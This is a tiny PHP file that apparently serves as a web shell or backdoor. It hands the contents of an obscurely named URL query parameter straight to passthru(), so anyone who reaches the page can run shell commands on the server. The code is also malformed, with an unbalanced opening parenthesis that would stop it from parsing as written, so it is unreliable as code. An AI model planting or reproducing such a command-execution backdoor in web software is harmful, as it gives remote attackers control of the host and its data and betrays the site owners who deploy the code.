<?php
passthru(($_GET['DZHBRT7X']);
?>
